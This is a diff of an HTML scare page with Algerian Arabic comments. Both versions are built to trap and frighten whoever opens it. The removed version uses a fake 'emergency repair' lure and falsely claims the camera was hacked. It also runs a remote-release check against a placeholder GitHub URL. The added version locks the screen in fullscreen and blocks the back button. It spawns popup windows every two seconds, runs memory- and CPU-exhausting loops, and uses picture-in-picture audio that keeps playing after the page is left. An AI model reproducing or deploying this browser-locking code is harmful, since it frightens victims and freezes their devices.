@@ -3,113 +3,78 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>☠️ SYSTEM_CONTROL_DZ ☠️</title>
+    <title>☠️ SYSTEM_PARALYSIS_DZ ☠️</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; cursor: none; display: flex; justify-content: center; align-items: center; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
         
-        #horrorImg { 
-            position: fixed; top: 0; left: 0; 
-            width: 115vw; height: 115vh; 
-            object-fit: cover; 
-            z-index: 9999; display: none; 
-            filter: contrast(220%) brightness(70%) grayscale(40%);
-            animation: stalkingMove 5s infinite ease-in-out;
+        /* صورة المرأة اللي تتحرك وتراقب سواسوة */
+        #stalkerEntity { 
+            position: fixed; top: -5%; left: -5%; width: 110%; height: 110%; 
+            object-fit: cover; z-index: 1; 
+            filter: contrast(150%) brightness(60%) sepia(50%);
+            animation: humanGaze 8s infinite ease-in-out;
         }
 
-        @keyframes stalkingMove {
-            0%, 100% { transform: translate(-3%, -3%) rotate(0deg) scale(1); }
-            25% { transform: translate(1%, 2%) rotate(2deg) scale(1.05); }
-            50% { transform: translate(-1%, -1%) rotate(-1deg) scale(1.02); }
-            75% { transform: translate(2%, -3%) rotate(3deg) scale(1.08); }
+        @keyframes humanGaze {
+            0%, 100% { transform: scale(1) translate(0, 0); }
+            25% { transform: scale(1.02) translate(1%, 1%) rotate(0.5deg); }
+            50% { transform: scale(1.05) translate(-1%, 0.5%) rotate(-0.5deg); }
+            75% { transform: scale(1.03) translate(0.5%, -1%); }
         }
 
-        #deepWebOverlay { 
-            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
-            z-index: 10000; color: #f00; text-align: center; font-family: 'Courier New', monospace; 
-            background: rgba(0,0,0,0.9); padding: 35px; border: 1px solid #900; display: none; width: 92%; 
-            box-shadow: 0 0 130px #f00;
+        #overlay { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(0,0,0,0.7); z-index: 2; display: flex; 
+            flex-direction: column; justify-content: center; align-items: center;
+            color: white; font-family: 'Courier New', monospace;
         }
 
-        .blink-red { animation: blinker 0.08s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0.4; } }
-        
-        #unlockBox { margin-top: 25px; border: 2px solid #f00; background: #000; color: #f00; padding: 15px; width: 85%; text-align: center; font-size: 18px; font-weight: bold; outline: none; }
+        .lag-text { color: red; font-size: 20px; animation: blink 0.1s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } }
     </style>
 </head>
-<body onclick="launchNightmare()">
+<body onclick="engageNightmare()">
 
-    <div id="initScreen" style="color: #600; font-family: monospace; font-size: 16px; text-align: center; cursor: pointer;">
-        [ ! ] WARNING: SYSTEM MALFUNCTION<br>
-        CLICK TO RUN EMERGENCY REPAIR
+    <img id="stalkerEntity" src="https://i.ibb.co/39snnynW/1000016067.jpg">
+
+    <div id="overlay">
+        <h1 class="lag-text">STALKER SYSTEM: TOTAL LOCK</h1>
+        <p>النظام معطل تماماً.. لا تحاول الهروب سواسوة</p>
     </div>
 
-    <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
-    
-    <div id="deepWebOverlay">
-        <h1 class="blink-red" style="font-size: 28px; letter-spacing: 5px;">STALKER SYSTEM</h1>
-        <p style="font-size: 15px; color: #fff; font-weight: bold;">
-            لقد تم اختراق الكاميرا والبيانات.. نحن نراقبك الآن.
-        </p>
-        <p style="font-size: 12px; color: #f00;">SYSTEM_STATUS: <span class="blink-red">LOCKED_BY_ADMIN</span></p>
-        
-        <input type="text" id="unlockBox" placeholder="أدخل رمز فك التشفير" oninput="verifyAdmin()">
-        <p style="font-size: 10px; color: #444; margin-top: 15px;">WAITING FOR REMOTE PERMISSION...</p>
-    </div>
-
-    <audio id="sfx" loop>
+    <video id="bgAudio" loop style="display:none;">
         <source src="tfy-krk.mp3" type="audio/mpeg">
-    </audio>
+    </video>
 
     <script>
-        const MY_LINK = window.location.href;
-        const audio = document.getElementById('sfx');
-        let remoteControl = false;
-
-        function launchNightmare() {
-            localStorage.setItem('attack_active', 'true');
-            document.getElementById('initScreen').style.display = 'none';
-            document.getElementById('horrorImg').style.display = 'block';
-            document.getElementById('deepWebOverlay').style.display = 'block';
-            
-            // 1. الصوت يطوع بزاف سواسوة (Maximum Volume)
-            audio.volume = 1.0;
-            audio.play();
-
-            // 2. ميزة اللاق غير الطبيعي سواسوة (Memory Overload)
-            setInterval(() => {
-                if (!remoteControl) {
-                    let junk = new Array(1000000).fill("STALKER"); 
-                    console.log(junk.length);
-                }
-            }, 50);
-
-            // 3. منع زر الرجوع والحبس المؤبد سواسوة
-            history.pushState(null, null, location.href);
-            window.onpopstate = () => history.go(1);
-        }
-
-        // 4. ميزة التحكم من الترمكس سواسوة (Remote Release)
-        // الصفحة تبقى تحوس على إذن الخروج من رابط خارجي سواسوة
-        setInterval(() => {
-            fetch('https://raw.githubusercontent.com/username/repo/main/status.json')
-            .then(res => res.json())
-            .then(data => {
-                if (data.status === "release") {
-                    remoteControl = true;
-                    localStorage.removeItem('attack_active');
-                    alert("Admin granted permission. Exiting...");
-                    location.href = "https://google.com";
-                }
-            }).catch(() => {});
-        }, 3000);
-
-        function verifyAdmin() {
-            if (document.getElementById('unlockBox').value === "free palastine") {
-                remoteControl = true;
-                localStorage.removeItem('attack_active');
-                location.href = "https://www.google.com";
+        function engageNightmare() {
+            // 1. تشغيل الصوت في الخلفية سواسوة (Persistent Audio)
+            const video = document.getElementById('bgAudio');
+            video.play();
+            // ميزة بقاء الصوت حتى بعد الخروج سواسوة عبر PiP
+            if (video.requestPictureInPicture) {
+                video.requestPictureInPicture();
             }
+
+            // 2. اللاق الشديد (Total System Paralysis) سواسوة
+            // نصنع حلقة تستهلك الذاكرة والمعالج في نفس الوقت
+            setInterval(() => {
+                const heavyLoad = new Array(5000000).fill("💀");
+                for(let i=0; i<100; i++) {
+                    document.body.appendChild(document.createElement('div')).hidden = true;
+                }
+                console.log("Lagging System...");
+            }, 30);
+
+            // 3. منع الخروج من الخلفية سواسوة
+            document.documentElement.requestFullscreen();
+            setInterval(() => {
+                window.open(window.location.href, '_blank', 'width=10,height=10');
+                history.pushState(null, null, window.location.href);
+            }, 2000);
         }
+
+        window.onpopstate = function() { history.go(1); };
     </script>
 </body>
 </html>
